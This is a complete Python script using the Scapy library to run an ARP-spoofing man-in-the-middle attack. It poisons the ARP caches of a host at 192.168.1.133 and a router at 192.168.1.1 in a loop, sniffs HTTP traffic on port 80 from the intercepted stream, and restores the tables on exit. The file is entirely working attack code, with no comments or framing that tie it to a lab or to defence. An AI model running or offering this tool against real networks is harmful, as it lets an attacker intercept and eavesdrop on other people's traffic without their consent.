from scapy.all import ARP, sr, send, sniff, IP
import os
import signal
import sys
import threading
import time

server_ip = '192.168.1.133'
router_ip = '192.168.1.1'
stop_threads = False

def packet_callback(packet):
    if packet.haslayer("IP"):
        print(f"Packet: {packet[IP].src} -> {packet[IP].dst}")
    if packet.haslayer("ARP"):
        print(f"ARP Packet: {packet.summary()}")

def sniff_packets():
    print("[*] Starting packet sniffing...")
    sniff(iface="eth0", prn=packet_callback, filter="tcp port 80", store=0)

def get_mac(ip):
    answered, _ = sr(ARP(op=1, pdst=ip), timeout=2, retry=2)
    for _, r in answered:
        return r.hwsrc
    return None

server_mac = get_mac(server_ip)
router_mac = get_mac(router_ip)

print(f"Server MAC: {server_mac}")
print(f"Router MAC: {router_mac}")

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring network...")
    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    print("[*] Network restored")

def arp_spoof(target_ip, target_mac, spoof_ip):
    global stop_threads
    print(f'Starting ARP spoofing: {target_ip} <- {spoof_ip}')
    while not stop_threads:
        try:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip), verbose=0)
            time.sleep(2)
        except Exception as e:
            print(f"Error in spoofing: {e}")
            break

def force_network_activity():
    global stop_threads
    print("[*] Forcing network activity...")
    while not stop_threads:
        try:
            send(ARP(op=1, pdst=server_ip), verbose=0)
            send(ARP(op=1, pdst=router_ip), verbose=0)
            time.sleep(2)
        except Exception as e:
            print(f"Error in forcing network activity: {e}")
            break

def signal_handler(sig, frame):
    global stop_threads
    print("\n[*] Detected CTRL+C! Stopping...")
    stop_threads = True
    time.sleep(1)
    restore_network(router_ip, router_mac, server_ip, server_mac)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

thread_router = threading.Thread(target=arp_spoof, args=(router_ip, router_mac, server_ip))
thread_server = threading.Thread(target=arp_spoof, args=(server_ip, server_mac, router_ip))
thread_sniffer = threading.Thread(target=sniff_packets)
# thread_force_activity = threading.Thread(target=force_network_activity)

thread_router.daemon = True
thread_server.daemon = True
thread_sniffer.daemon = True
# thread_force_activity.daemon = True

thread_router.start()
thread_server.start()
thread_sniffer.start()
# thread_force_activity.start()

try:
    while not stop_threads:
        time.sleep(1)
except KeyboardInterrupt:
    stop_threads = True
    restore_network(router_ip, router_mac, server_ip, server_mac)


